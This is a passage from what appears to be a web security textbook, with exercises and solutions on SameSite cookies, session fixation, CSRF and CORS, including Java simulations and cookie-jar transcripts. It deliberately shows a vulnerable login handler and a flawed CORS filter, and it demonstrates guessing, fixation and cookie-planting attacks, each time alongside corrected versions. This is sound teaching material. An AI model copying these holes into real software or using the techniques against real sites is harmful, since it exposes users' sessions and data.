The victim, `alice`, is logged in to the shop with the cookie described.  
Say whether the attacker's request ends as `STOLEN` (the money moves), `no cookie` (the browser withholds the session cookie),  
`rejected` (the cookie arrives and the server's check refuses) or `preflight fails` (the browser never sends the request).

| #   | Session cookie          | Endpoint                       | Where the attacker's page runs | How the request is made                                     |
| --- | ----------------------- | ------------------------------ | ------------------------------ | ----------------------------------------------------------- |
| 01  | `SameSite=Lax`          | `POST /transfer`, cookie alone | `evil.localhost`               | An auto-submitted form                                      |
| 02  | `SameSite=Lax`          | `GET /transfer-get`            | `evil.localhost`               | An auto-submitted `GET` form (a link)                       |
| 03  | `SameSite=Strict`       | `GET /transfer-get`            | `evil.localhost`               | The same                                                    |
| 04  | No `SameSite`           | `POST /transfer`               | `evil.localhost`               | A form posted (a) 10 seconds, (b) 3 minutes after the login |
| 05  | `SameSite=Strict`       | `POST /transfer`               | `blog.shop.localhost`          | A form                                                      |
| 06  | `SameSite=Lax`          | `POST /transfer-origin`        | `blog.shop.localhost`          | A form                                                      |
| 07  | `SameSite=None; Secure` | `POST /transfer-token`         | `evil.localhost`               | A form                                                      |
| 08  | `SameSite=None; Secure` | `POST /transfer-json`          | `evil.localhost`               | `fetch` with `Content-Type: application/json`               |

**Part 2.** The shop wants `POST /orders/{id}/cancel`, authenticated by the session cookie alone (no bearer tokens).  
List the layers you would put in front of it.  
For each layer say which of these attackers it stops: a page on an unrelated site, a page on a sibling subdomain, a browser that ignores `SameSite`, a script injected by XSS.

### Exercise 05: review a CORS filter

A filter on `https://api.example.com`, whose legitimate callers are `https://shop.example.com` and `https://app.example.com`, and whose endpoints authenticate by cookie:

```java
String origin = request.getHeader("Origin");
if (origin != null && (origin.contains("example.com") || origin.equals("null"))) {        // 01
    response.setHeader("Access-Control-Allow-Origin", origin);                            // 02
    response.setHeader("Access-Control-Allow-Credentials", "true");
    response.setHeader("Access-Control-Allow-Methods", "*");                              // 03
    response.setHeader("Access-Control-Allow-Headers", "*");
    response.setHeader("Access-Control-Max-Age", "86400");                                // 04
}
if (request.getMethod().equals("OPTIONS")) { response.setStatus(200); return; }           // 05
chain.doFilter(request, response);
// POST /orders parses the body as JSON whatever its Content-Type, because "CORS keeps other sites out"   // 06
```

**Part 1.** Find at least six defects. For each, say who can exploit it and how.

**Part 2.** Write the corrected filter and test it against these `Origin` values: both legitimate ones,  
`https://evil.net`, `https://evil-example.com`, `https://example.com.evil.net`, `https://notexample.com`, `http://shop.example.com`, `https://shop.example.com:8443`, `https://blog.shop.example.com`, `null`, and no `Origin` field.

### Exercise 06: the cookie tax and a third-party migration

**Part 1.** A page makes 60 requests to the shop's host.  
On each one the browser sends a `Cookie` field of 1,830 bytes.  
The shop has 5 million page views a day. (a) How many bytes of cookies does the shop receive per day?  
(b) 45 of the 60 requests are for static files that need no cookie.  
How much does a cookieless static host save per day?  
(c) The team replaces the 26-byte session cookie by the 173-byte signed token of Lab 04.  
How much more does it receive per day on the 15 requests that still carry cookies? And if the static files had still carried it?

**Part 2.** A partner site `partner.example.org` embeds the shop's "track my order" widget in an iframe, served from `widgets.example.com`.  
The widget remembers the last order number in `Set-Cookie: wid=<id>; SameSite=None; Secure; Domain=widgets.example.com`.  
A growing share of visitors browse with third-party cookie blocking on. What happens to the widget, what do you change, and what do you give up?

---

## 10.10 Solutions

### Solution 01

**Part 1.** `Classify.java` computes both relations with the jar's public suffix list:

```java
import java.net.URI;
import java.util.List;
import java.util.Set;

// Exercise 01 check: is a request URL same-origin and same-site with the page that causes it?
// The public suffix list is the jar's tiny one; the site includes the scheme (schemeful same-site).
public class Classify {
    static final Set<String> SUFFIXES = Set.of("com", "org", "net", "edu", "io", "uk", "co.uk", "github.io", "localhost", "test");

    static int port(URI u) { return u.getPort() != -1 ? u.getPort() : u.getScheme().equals("https") ? 443 : 80; }

    static String origin(URI u) { return u.getScheme() + "://" + u.getHost() + ":" + port(u); }

    // registrable domain: the shortest suffix of the host that has one label more than a public suffix
    static String registrable(String host) {
        String[] labels = host.split("\\.");
        for (int i = labels.length - 1; i >= 0; i--) {
            String candidate = String.join(".", List.of(labels).subList(i, labels.length));
            if (!SUFFIXES.contains(candidate)) return candidate;
        }
        return host;
    }

    static String site(URI u) { return u.getScheme() + "://" + registrable(u.getHost()); }

    public static void main(String[] args) {
        String[][] rows = {
            {"https://shop.example.com/", "https://shop.example.com/account/orders"},
            {"https://shop.example.com/", "https://shop.example.com/cart"},
            {"https://app.example.com/", "https://shop.example.com/cart"},
            {"https://evil.example.net/", "https://shop.example.com/cart"},
            {"https://shop.example.com/", "http://shop.example.com/cart"},
            {"https://shop.example.com/cart", "https://shop.example.com:443/orders"},
            {"https://shop.example.com/cart", "https://shop.example.com:8443/cart"},
            {"https://shop.example.com/cart", "https://shop.example.com.evil.net/"},
            {"https://alice.github.io/", "https://bob.github.io/"},
            {"https://example.co.uk/", "https://other.co.uk/"},
        };
        System.out.printf("%-34s %-42s %-12s %s%n", "page", "request", "same origin?", "same site?");
        for (String[] r : rows) {
            URI page = URI.create(r[0]), req = URI.create(r[1]);
            System.out.printf("%-34s %-42s %-12s %s%n", r[0], r[1],
                origin(page).equals(origin(req)) ? "yes" : "no", site(page).equals(site(req)) ? "yes" : "no");
        }
    }
}
```

```text
page                               request                                    same origin? same site?
https://shop.example.com/          https://shop.example.com/account/orders    yes          yes
https://shop.example.com/          https://shop.example.com/cart              yes          yes
https://app.example.com/           https://shop.example.com/cart              no           yes
https://evil.example.net/          https://shop.example.com/cart              no           no
https://shop.example.com/          http://shop.example.com/cart               no           no
https://shop.example.com/cart      https://shop.example.com:443/orders        yes          yes
https://shop.example.com/cart      https://shop.example.com:8443/cart         no           yes
https://shop.example.com/cart      https://shop.example.com.evil.net/         no           no
https://alice.github.io/           https://bob.github.io/                     no           no
https://example.co.uk/             https://other.co.uk/                       no           no
```

The non-obvious rows: 05 differs in scheme, so neither relation holds (the site includes the scheme).  
06 is the same origin because 443 is the default port of `https`.  
07 differs in port, so it is cross-origin and still same-site, because the site ignores the port. 08 looks like the shop and is a host under `evil.net`.  
09 and 10 are cross-site because `github.io` and `co.uk` are public suffixes: the registrable domains are `alice.github.io` and `bob.github.io`, `example.co.uk` and `other.co.uk`.

**Part 2.** The scenario and the jar's answer, with the reason for every cookie that stays home:

```text
# Exercise 01: five cookies set by one login response, then seven requests
set https://shop.example.com/account/login   a=1
set https://shop.example.com/account/login   b=2; Domain=example.com; Path=/
set https://shop.example.com/account/login   c=3; Secure; Path=/; SameSite=Strict
set https://shop.example.com/account/login   d=4; Path=/; SameSite=None; Secure
set https://shop.example.com/account/login   e=5; Path=/; Secure; HttpOnly; SameSite=Lax
# 01. the shop's own page fetches an account URL
get https://shop.example.com/account/orders --site=https://shop.example.com/
# 02. the shop's own page fetches the cart
get https://shop.example.com/cart --site=https://shop.example.com/
# 03. a script on app.example.com calls the shop with credentials
get https://shop.example.com/cart --site=https://app.example.com/
# 04. an image on evil.example.net
get https://shop.example.com/cart --site=https://evil.example.net/
# 05. a link on evil.example.net is clicked
get https://shop.example.com/cart --site=https://evil.example.net/ --nav
# 06. a form on evil.example.net posts to the shop, ten seconds after the cookies were set
advance 10
get https://shop.example.com/cart --site=https://evil.example.net/ --nav --method=POST
# 07. a link on the shop's own https page leads to the http version of the shop
get http://shop.example.com/cart --site=https://shop.example.com/ --nav
# 08. a script on the shop's page reads document.cookie
get https://shop.example.com/ --site=https://shop.example.com/ --script
```

```text
# Exercise 01: five cookies set by one login response, then seven requests
set https://shop.example.com/account/login   a=1
  -> stored a=1 (host-only shop.example.com, path /account, SameSite=default, session)
set https://shop.example.com/account/login   b=2; Domain=example.com; Path=/
  -> stored b=2 (domain example.com, path /, SameSite=default, session)
set https://shop.example.com/account/login   c=3; Secure; Path=/; SameSite=Strict
  -> stored c=3 (host-only shop.example.com, path /, Secure, SameSite=Strict, session)
set https://shop.example.com/account/login   d=4; Path=/; SameSite=None; Secure
  -> stored d=4 (host-only shop.example.com, path /, Secure, SameSite=None, session)
set https://shop.example.com/account/login   e=5; Path=/; Secure; HttpOnly; SameSite=Lax
  -> stored e=5 (host-only shop.example.com, path /, Secure, HttpOnly, SameSite=Lax, session)
# 01. the shop's own page fetches an account URL
get https://shop.example.com/account/orders --site=https://shop.example.com/
  -> Cookie: a=1; b=2; c=3; d=4; e=5
# 02. the shop's own page fetches the cart
get https://shop.example.com/cart --site=https://shop.example.com/
  -> Cookie: b=2; c=3; d=4; e=5
     skipped a: path /account does not match /cart
# 03. a script on app.example.com calls the shop with credentials
get https://shop.example.com/cart --site=https://app.example.com/
  -> Cookie: b=2; c=3; d=4; e=5
     skipped a: path /account does not match /cart
# 04. an image on evil.example.net
get https://shop.example.com/cart --site=https://evil.example.net/
  -> Cookie: d=4
     skipped a: path /account does not match /cart
     skipped b: default (Lax), cross-site subresource request
     skipped c: SameSite=Strict, cross-site request
     skipped e: SameSite=Lax, cross-site subresource request
# 05. a link on evil.example.net is clicked
get https://shop.example.com/cart --site=https://evil.example.net/ --nav
  -> Cookie: b=2; d=4; e=5
     skipped a: path /account does not match /cart
     skipped c: SameSite=Strict, cross-site request
# 06. a form on evil.example.net posts to the shop, ten seconds after the cookies were set
advance 10
get https://shop.example.com/cart --site=https://evil.example.net/ --nav --method=POST
  -> Cookie: b=2; d=4
     skipped a: path /account does not match /cart
     skipped c: SameSite=Strict, cross-site request
     skipped e: SameSite=Lax, cross-site POST navigation
# 07. a link on the shop's own https page leads to the http version of the shop
get http://shop.example.com/cart --site=https://shop.example.com/ --nav
  -> Cookie: b=2
     skipped a: path /account does not match /cart
     skipped c: Secure cookie, insecure request
     skipped d: Secure cookie, insecure request
     skipped e: Secure cookie, insecure request
# 08. a script on the shop's page reads document.cookie
get https://shop.example.com/ --site=https://shop.example.com/ --script
  -> Cookie: b=2; c=3; d=4
     skipped a: path /account does not match /
     skipped e: HttpOnly cookie, script API
```

| #   | Sent          | Why the others do not go                                                                                                                                                                  |
| --- | ------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 01  | a, b, c, d, e | Same origin, and `/account/orders` is below `a`'s default path `/account` (the path of the *setting* URL, `/account/login`, cut at the last `/`)                                          |
| 02  | b, c, d, e    | `a` is for `/account`, not `/cart`                                                                                                                                                        |
| 03  | b, c, d, e    | `app.example.com` is same-site with the shop, so `Strict` (`c`) goes too: `SameSite` compares sites                                                                                       |
| 04  | d             | A cross-site image: only `SameSite=None` goes. `b` has no attribute (Lax-like), `c` is Strict, `e` is Lax                                                                                 |
| 05  | b, d, e       | A clicked link is a top-level `GET`: Lax and the default go, Strict does not                                                                                                              |
| 06  | b, d          | A top-level `POST`: `e` (explicit Lax) stays home. `b` (no attribute) goes because the cookie is under two minutes old                                                                    |
| 07  | b             | `c`, `d` and `e` are `Secure` and the request is `http`. `b` has no `Secure`, and as a top-level `GET` it passes the default rule although the scheme change makes the request cross-site |
| 08  | b, c, d       | A script cannot see `e` (`HttpOnly`) and `a` is not for `/`                                                                                                                               |

The trap in 03 is thinking `Strict` means "same origin".  
The trap in 07 is the reverse: a downgrade to `http` still sends cookies that do not demand `Secure`.

### Solution 02

**Part 1.** One host holds the session, and each host that needs a login makes its own after an exchange.  
The first host the user logs in to sets a host-only cookie with the strictest prefix:

```text
accounts.example.com:  Set-Cookie: __Host-sid=<128 random bits>; Path=/; Secure; HttpOnly; SameSite=Lax
```

After a successful login, `accounts` redirects the browser to `https://app.example.com/callback?code=<one-time code>`.  
`app` exchanges the code with `accounts` server to server (the OpenID Connect authorization code flow, R10) and sets its own cookie:

```text
app.example.com:       Set-Cookie: __Host-app=<128 random bits>; Path=/; Secure; HttpOnly; SameSite=Lax
```

`www` sets no cookie. Neither cookie has a `Domain`, so each goes to exactly one host.  
`docs` receives neither. This is design B:

```text
# Exercise 02, design B: the session lives on one host, the app has its own
set https://accounts.example.com/login   __Host-sid=SESSION-2; Secure; HttpOnly; Path=/; SameSite=Lax
set https://app.example.com/callback   __Host-app=APP-SESSION-1; Secure; HttpOnly; Path=/; SameSite=Lax
# B1. which host receives what?
get https://accounts.example.com/
get https://app.example.com/
get https://docs.example.com/
# B2. docs tries to plant the app's cookie for the whole site
set https://docs.example.com/page   __Host-app=ATTACKER; Domain=example.com; Path=/; Secure
# B3. docs plants it host-only, for itself: the app does not receive it
set https://docs.example.com/page   __Host-app=ATTACKER; Path=/; Secure
get https://app.example.com/
get https://docs.example.com/
```

```text
# Exercise 02, design B: the session lives on one host, the app has its own
set https://accounts.example.com/login   __Host-sid=SESSION-2; Secure; HttpOnly; Path=/; SameSite=Lax
  -> stored __Host-sid=SESSION-2 (host-only accounts.example.com, path /, Secure, HttpOnly, SameSite=Lax, session)
set https://app.example.com/callback   __Host-app=APP-SESSION-1; Secure; HttpOnly; Path=/; SameSite=Lax
  -> stored __Host-app=APP-SESSION-1 (host-only app.example.com, path /, Secure, HttpOnly, SameSite=Lax, session)
# B1. which host receives what?
get https://accounts.example.com/
  -> Cookie: __Host-sid=SESSION-2
     skipped __Host-app: domain app.example.com does not match accounts.example.com
get https://app.example.com/
  -> Cookie: __Host-app=APP-SESSION-1
     skipped __Host-sid: domain accounts.example.com does not match app.example.com
get https://docs.example.com/
  -> (no Cookie field)
     skipped __Host-sid: domain accounts.example.com does not match docs.example.com
     skipped __Host-app: domain app.example.com does not match docs.example.com
# B2. docs tries to plant the app's cookie for the whole site
set https://docs.example.com/page   __Host-app=ATTACKER; Domain=example.com; Path=/; Secure
  -> ignored: __Host- prefix forbids Domain
# B3. docs plants it host-only, for itself: the app does not receive it
set https://docs.example.com/page   __Host-app=ATTACKER; Path=/; Secure
  -> stored __Host-app=ATTACKER (host-only docs.example.com, path /, Secure, SameSite=default, session)
get https://app.example.com/
  -> Cookie: __Host-app=APP-SESSION-1
     skipped __Host-sid: domain accounts.example.com does not match app.example.com
     skipped __Host-app: domain docs.example.com does not match app.example.com
get https://docs.example.com/
  -> Cookie: __Host-app=ATTACKER
     skipped __Host-sid: domain accounts.example.com does not match docs.example.com
     skipped __Host-app: domain app.example.com does not match docs.example.com
```

`accounts` and `app` each receive only their own cookie. `docs` receives nothing.  
When `docs` tries to plant `__Host-app` for the whole site, the jar refuses (`__Host- prefix forbids Domain`), and when it plants it host-only,  
the cookie exists only for `docs` and `app` never receives it.

**Part 2.** Design A, one cookie for the whole site:

```text
# Exercise 02, design A: one session cookie for the whole site
set https://accounts.example.com/login   sso=SESSION-1; Domain=example.com; Path=/; Secure; HttpOnly; SameSite=Lax
# A1. does the app get it?
get https://app.example.com/
# A2. does the untrusted docs host get it?
get https://docs.example.com/
# A3. docs plants a cookie of the same name for the whole site, and the app is asked next
set https://docs.example.com/page   sso=ATTACKER; Domain=example.com; Path=/; Secure
get https://app.example.com/
get https://accounts.example.com/
```

```text
# Exercise 02, design A: one session cookie for the whole site
set https://accounts.example.com/login   sso=SESSION-1; Domain=example.com; Path=/; Secure; HttpOnly; SameSite=Lax
  -> stored sso=SESSION-1 (domain example.com, path /, Secure, HttpOnly, SameSite=Lax, session)
# A1. does the app get it?
get https://app.example.com/
  -> Cookie: sso=SESSION-1
# A2. does the untrusted docs host get it?
get https://docs.example.com/
  -> Cookie: sso=SESSION-1
# A3. docs plants a cookie of the same name for the whole site, and the app is asked next
set https://docs.example.com/page   sso=ATTACKER; Domain=example.com; Path=/; Secure
  -> replaced sso=ATTACKER (domain example.com, path /, Secure, SameSite=default, session)
get https://app.example.com/
  -> Cookie: sso=ATTACKER
get https://accounts.example.com/
  -> Cookie: sso=ATTACKER
```

`docs` receives the session (A2): the browser sends the cookie to the `docs` server with every request, so the host that serves customers' pages sees every user's session id.  
And `docs` can overwrite it (A3): its `sso=ATTACKER; Domain=example.com; Secure` replaces the real cookie (`replaced`), after which `accounts` and `app` both receive the attacker's value.  
That is a forced logout at minimum, and a fixation or login CSRF when the servers accept the planted id.

**Part 3.** `docs` is untrusted content on your registrable domain.  
Even with design B it can send same-site requests to `app` that `SameSite` waves through (Lab 05 part A2), its scripts can set cookies that shadow others by name, and an XSS there is a foothold next to the product.  
The structural fix is a different registrable domain for customer content (for example `example-docs.net`, the way large sites use separate domains for user content),  
which also removes `docs` from the same-site relation. Until then, keep an `Origin` or `Sec-Fetch-Site` check on every state-changing request in `app`.

### Solution 03

**Part 1.** The defects, with the lab's evidence for the three that can be run:

| #   | Line | Defect                                                                     | Attack                                                                                                                      |
| --- | ---- | -------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------- |
| 01  | 01   | The session id is accepted from the request, even from the URL             | **Fixation**: the attacker chooses the id (WeakLogin attack 2)                                                              |
| 02  | 02   | The id is a counter starting at 1000                                       | **Guessing**: ids near yours belong to other users (WeakLogin attack 1)                                                     |
| 03  | 04   | The id is kept at login: the pre-login session becomes the logged-in one   | **Fixation**, again, even without line 01 (any way of planting an id works)                                                 |
| 04  | 05   | The cookie has no `Secure`, `HttpOnly`, `SameSite`, `Path` and no prefix   | **Sniffing** over HTTP, **theft** by XSS, **CSRF** by default rules; no `Path`, so the scope depends on the URL that set it |
| 05  | 05   | `Max-Age=315360000` is ten years, and the server never expires the session | A stolen id works for a year or more; browsers cap the cookie at 400 days (below), and no server-side timeout exists        |
| 06  | 06   | Logout only asks the browser to delete the cookie                          | A copied id still works after the user logs out (WeakLogin attack 3)                                                        |
| 07  | all  | The map is keyed by the raw id, in the server's memory                     | A leaked store hands out working sessions, and a second server cannot see this one's sessions                               |

The programs for 01 to 03 and 06, the handler as written next to the corrected one, with the same three attacks:

```java
import java.security.SecureRandom;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;
import java.util.function.Function;

// Exercise 03 check: the login handler under review, modelled in memory, and a corrected one, each put through the
// same three attacks. No sockets: a "request" is a call, a "cookie" is the string the handler returns.
public class WeakLogin {
    interface Shop {
        String login(String sidInRequest, String user, String password);    // returns the sid to put in Set-Cookie, or null
        String whoAmI(String sid);                                          // the user the sid belongs to, or null
        void logout(String sid);
    }

    // The handler as written in the exercise
    static class Weak implements Shop {
        final Map<String, String> sessions = new HashMap<>();
        int counter = 1000;
        public String login(String sidInRequest, String user, String password) {
            String sid = sidInRequest;                                       // bug: accepted from the request, even from the URL
            if (sid == null) sid = String.valueOf(counter++);                // bug: a counter
            if (!"wonderland".equals(password)) return null;
            sessions.put(sid, user);                                         // bug: the id is kept at login
            return sid;
        }
        public String whoAmI(String sid) { return sessions.get(sid); }
        public void logout(String sid) { /* bug: only the cookie is cleared, in the response */ }
    }

    // The corrected handler
    static class Fixed implements Shop {
        final Map<String, String> sessions = new HashMap<>();
        final SecureRandom random = new SecureRandom();
        String newId() { byte[] b = new byte[16]; random.nextBytes(b); return Base64.getUrlEncoder().withoutPadding().encodeToString(b); }
        public String login(String sidInRequest, String user, String password) {
            if (!"wonderland".equals(password)) return null;
            if (sidInRequest != null) sessions.remove(sidInRequest);         // the old id dies at login
            String sid = newId();                                            // 128 random bits
            sessions.put(sid, user);
            return sid;
        }
        public String whoAmI(String sid) { return sessions.get(sid); }
        public void logout(String sid) { sessions.remove(sid); }
    }

    static void run(String name, Function<Void, Shop> make) {
        System.out.println("== " + name + " ==");
        Shop shop = make.apply(null);

        // Attack 1: guess ids. alice and bob log in; mallory logs in and sees her own id, then tries the neighbours.
        shop.login(null, "alice", "wonderland");
        shop.login(null, "bob", "wonderland");
        String mine = shop.login(null, "mallory", "wonderland");
        StringBuilder found = new StringBuilder();
        if (mine.chars().allMatch(Character::isDigit)) {
            int base = Integer.parseInt(mine);
            for (int guess = base - 5; guess <= base + 5; guess++) {
                String who = shop.whoAmI(String.valueOf(guess));
                if (who != null && !who.equals("mallory")) found.append(who).append(" at ").append(guess).append("; ");
            }
        }
        System.out.println("1. guessing neighbours of mallory's id " + (mine.length() > 8 ? "<random>" : mine) + ": "
            + (found.length() == 0 ? "found nothing (the ids are 128 random bits)" : "found " + found));

        // Attack 2: fixation. The attacker chooses the id, the victim logs in with it.
        shop.login("fixed-by-attacker", "carol", "wonderland");
        String hijacked = shop.whoAmI("fixed-by-attacker");
        System.out.println("2. fixation: the attacker's id 'fixed-by-attacker' after carol logs in with it: "
            + (hijacked == null ? "not a session" : "belongs to " + hijacked));

        // Attack 3: logout. alice logs out; an attacker who copied her id earlier tries again.
        String aliceSid = shop.login(null, "alice", "wonderland");
        shop.logout(aliceSid);
        String after = shop.whoAmI(aliceSid);
        System.out.println("3. alice's copied id after she logs out: " + (after == null ? "rejected" : "still alice"));
        System.out.println();
    }

    public static void main(String[] args) {
        run("the handler as written", v -> new Weak());
        run("the corrected handler", v -> new Fixed());
    }
}
```

```text
== the handler as written ==
1. guessing neighbours of mallory's id 1002: found alice at 1000; bob at 1001; 
2. fixation: the attacker's id 'fixed-by-attacker' after carol logs in with it: belongs to carol
3. alice's copied id after she logs out: still alice

== the corrected handler ==
1. guessing neighbours of mallory's id <random>: found nothing (the ids are 128 random bits)
2. fixation: the attacker's id 'fixed-by-attacker' after carol logs in with it: not a session
3. alice's copied id after she logs out: rejected
```

As written, the attacker finds alice and bob next to their own id, the fixed id belongs to carol after she logs in, and alice's copied id still works after logout.  
The corrected handler fails all three attacks.  
The cookie of line 05, and its replacement, put through the jar:

```text
# Exercise 03: what the browser does with the cookie the handler sends: Set-Cookie: sid=1001; Max-Age=315360000
set http://shop.example.com/login   sid=1001; Max-Age=315360000
# a script on any page of the host can read it, and it is sent over plain http
get http://shop.example.com/ --script
# the corrected cookie
set https://shop.example.com/login   __Host-sid=Xk3p9Qw2Zr8LmN4vB7cYtA; Path=/; Secure; HttpOnly; SameSite=Lax
get https://shop.example.com/ --script
get http://shop.example.com/
```

```text
# Exercise 03: what the browser does with the cookie the handler sends: Set-Cookie: sid=1001; Max-Age=315360000
set http://shop.example.com/login   sid=1001; Max-Age=315360000
  -> stored sid=1001 (host-only shop.example.com, path /, SameSite=default, expires in 34560000 s)
# a script on any page of the host can read it, and it is sent over plain http
get http://shop.example.com/ --script
  -> Cookie: sid=1001
# the corrected cookie
set https://shop.example.com/login   __Host-sid=Xk3p9Qw2Zr8LmN4vB7cYtA; Path=/; Secure; HttpOnly; SameSite=Lax
  -> stored __Host-sid=Xk3p9Qw2Zr8LmN4vB7cYtA (host-only shop.example.com, path /, Secure, HttpOnly, SameSite=Lax, session)
get https://shop.example.com/ --script
  -> Cookie: sid=1001
     skipped __Host-sid: HttpOnly cookie, script API
get http://shop.example.com/
  -> Cookie: sid=1001
     skipped __Host-sid: Secure cookie, insecure request
```

The ten-year cookie is stored as `expires in 34560000 s`, 400 days, and a script and a plain-`http` request both receive it.  
The corrected cookie is hidden from the script (`HttpOnly cookie, script API`) and withheld from the plain request (`Secure cookie, insecure request`).

**Part 2.** The corrected handlers:

```java
// POST /login
if (!users.passwordMatches(user, password)) return unauthorized();
String old = cookie(request, "__Host-sid");
if (old != null) sessions.remove(sha256(old));                         // the pre-login session dies
byte[] raw = new byte[16];
secureRandom.nextBytes(raw);                                           // 128 bits from the operating system
String sid = Base64.getUrlEncoder().withoutPadding().encodeToString(raw);   // 22 characters
sessions.put(sha256(sid), new Session(user, now(), now()));            // keyed by a hash; start time and last-seen time kept
response.addHeader("Set-Cookie", "__Host-sid=" + sid + "; Path=/; Secure; HttpOnly; SameSite=Lax");   // no Max-Age

// on every request: look up sha256(sid); reject if now - lastSeen > 30 minutes or now - start > 12 hours; update lastSeen

// POST /logout
sessions.remove(sha256(cookie(request, "__Host-sid")));                // the server forgets first
response.addHeader("Set-Cookie", "__Host-sid=; Path=/; Secure; HttpOnly; Max-Age=0");
```

No id is read from a parameter.  
The cookie has no `Max-Age`, so it is a session cookie, and the lifetime that counts is the server's two timeouts.  
The store, if it is shared between servers, is an external service keyed by the hash.

### Solution 04

**Part 1.** Every answer comes from a measured cell. The matrix of Lab 05 covers items 01 to 03, 04(a) and 05 to 08; item 04(b) combines the jar with Lab 03.

| #   | Outcome           | Evidence                                                                                                 |
| --- | ----------------- | -------------------------------------------------------------------------------------------------------- |
| 01  | `no cookie`       | Lab 05 A1, row `transfer`, column `lax`. `Lax` withholds the cookie from a cross-site `POST`             |
| 02  | `STOLEN`          | A1, row `transfer-get`, column `lax`. A `GET` navigation carries a `Lax` cookie                          |
| 03  | `no cookie`       | A1, row `transfer-get`, column `strict`                                                                  |
| 04a | `STOLEN`          | A1, row `transfer`, column `unset`. The form is posted seconds after login, inside the 2-minute window   |
| 04b | `no cookie`       | The jar below, and Lab 03 context 08 in Chromium: after 120 seconds the window has closed                |
| 05  | `STOLEN`          | A2, row `transfer`, column `strict`. A sibling is same-site, so `Strict` is satisfied                    |
| 06  | `rejected`        | A2, row `transfer-origin`, any column. The cookie arrives and the `Origin` is the blog's, not the shop's |
| 07  | `rejected`        | A1, row `transfer-token`, column `none`. The cookie arrives; the attacker has no token                   |
| 08  | `preflight fails` | A1, row `transfer-json`. A cross-origin JSON request needs a preflight the shop never approves           |

The timing in item 04, put to the jar: the cookie with no `SameSite` is sent at 10 seconds and at 90 seconds and withheld at 3 minutes,  
while the explicitly `Lax` cookie is never sent, and the sibling subdomain always gets both:

```text
# Exercise 04, item 04: a cookie with no SameSite attribute against a cross-site form post, as time passes
set https://shop.example.com/login   plain=1; Path=/; Secure; HttpOnly
set https://shop.example.com/login   lax=1; Path=/; Secure; HttpOnly; SameSite=Lax
# 10 seconds after login
advance 10
get https://shop.example.com/transfer --site=https://evil.example.net/ --nav --method=POST
# 90 seconds after login
advance 80
get https://shop.example.com/transfer --site=https://evil.example.net/ --nav --method=POST
# 3 minutes after login
advance 90
get https://shop.example.com/transfer --site=https://evil.example.net/ --nav --method=POST
# the same form on a sibling subdomain (same site) is always allowed
get https://shop.example.com/transfer --site=https://blog.shop.example.com/ --nav --method=POST
```

```text
# Exercise 04, item 04: a cookie with no SameSite attribute against a cross-site form post, as time passes
set https://shop.example.com/login   plain=1; Path=/; Secure; HttpOnly
  -> stored plain=1 (host-only shop.example.com, path /, Secure, HttpOnly, SameSite=default, session)
set https://shop.example.com/login   lax=1; Path=/; Secure; HttpOnly; SameSite=Lax
  -> stored lax=1 (host-only shop.example.com, path /, Secure, HttpOnly, SameSite=Lax, session)
# 10 seconds after login
advance 10
get https://shop.example.com/transfer --site=https://evil.example.net/ --nav --method=POST
  -> Cookie: plain=1
     skipped lax: SameSite=Lax, cross-site POST navigation
# 90 seconds after login
advance 80
get https://shop.example.com/transfer --site=https://evil.example.net/ --nav --method=POST
  -> Cookie: plain=1
     skipped lax: SameSite=Lax, cross-site POST navigation
# 3 minutes after login
advance 90
get https://shop.example.com/transfer --site=https://evil.example.net/ --nav --method=POST
  -> (no Cookie field)
     skipped plain: default (Lax), cross-site POST navigation older than 120 s
     skipped lax: SameSite=Lax, cross-site POST navigation
# the same form on a sibling subdomain (same site) is always allowed
get https://shop.example.com/transfer --site=https://blog.shop.example.com/ --nav --method=POST
  -> Cookie: plain=1; lax=1
```

**Part 2.** The layers, for `POST /orders/{id}/cancel`:

| Layer                                                                                                          | Unrelated site | Sibling subdomain | Browser without `SameSite`                                                  | XSS on the shop                               |
| -------------------------------------------------------------------------------------------------------------- | -------------- | ----------------- | --------------------------------------------------------------------------- | --------------------------------------------- |
| `SameSite=Lax`, stated explicitly, on the session cookie                                                       | stops          | no                | no                                                                          | no                                            |
| The change is a `POST`, never a `GET`                                                                          | needed for Lax | no                | no                                                                          | no                                            |
| Reject unless `Sec-Fetch-Site` is `same-origin`, or `Origin` equals the shop's origin when the first is absent | stops          | stops             | stops, when the browser sends `Origin` on `POST`, which all current ones do | no                                            |
| A CSRF token in the request, tied to the session                                                               | stops          | stops             | stops                                                                       | no (the script reads the page, Lab 05 try 03) |
| `Content-Type: application/json` required, exact CORS allowlist                                                | stops          | stops (preflight) | stops                                                                       | no                                            |
| Escaping, a content security policy                                                                            | n/a            | n/a               | n/a                                                                         | the real defence                              |

The first two layers are free and cover the common case.  
The third or fourth covers the sibling subdomain, where `SameSite` cannot, and the old browser.  
Only output escaping and a CSP address XSS; no CSRF layer does, because the injected script is same-origin and reads the token.  
Requests with neither `Sec-Fetch-Site` nor `Origin` do not come from a browser that can be tricked into forging; accept them only when they authenticate by something other than a cookie.

### Solution 05

**Part 1.** The defects:

| #   | Line | Defect                                                                              | Who exploits it, and how                                                                                                                             |
| --- | ---- | ----------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| 01  | 01   | `contains("example.com")` is a substring match                                      | A page on `evil-example.com`, `example.com.evil.net` or `notexample.com` reads a logged-in user's data (Lab 07 `containsbug`)                        |
| 02  | 01   | `equals("null")` is accepted                                                        | A sandboxed iframe or `data:` page, whose origin is `null`, reads the data (Lab 07 `null`)                                                           |
| 03  | 02   | The request's `Origin` is reflected with `Allow-Credentials: true`                  | Combined with 01 and 02, any matching origin gets cookies and answers. Reflection with credentials is the `creds` policy of Lab 07                   |
| 04  | 03   | `Allow-Methods: *` and `Allow-Headers: *` on a credentialed API                     | Not an attack: the wildcard is not honoured for requests with credentials, so a legitimate cross-origin `PUT` with a JSON body is refused (below)    |
| 05  | all  | No `Vary: Origin`                                                                   | A shared cache serves the `Allow-Origin` computed for one origin to the next (H09)                                                                   |
| 06  | 06   | `POST /orders` accepts a `text/plain` body as JSON, because CORS "keeps others out" | A cross-site form or `text/plain` `fetch` is a simple request: it runs on the server and only the reading is blocked (Lab 07 `none` row, marked `*`) |
| 07  | 04   | `Max-Age: 86400`                                                                    | A tightened policy takes up to the browser's cap to reach clients that approved the old one; Chromium caps at two hours                              |
| 08  | 05   | Every `OPTIONS` answered with `200`, whatever the `Origin`                          | Not harmful in itself; the response simply carries no approval, so it is better to answer a preflight only for allowed origins                       |

The filters side by side, on the eleven `Origin` values:

```java
import java.util.LinkedHashMap;
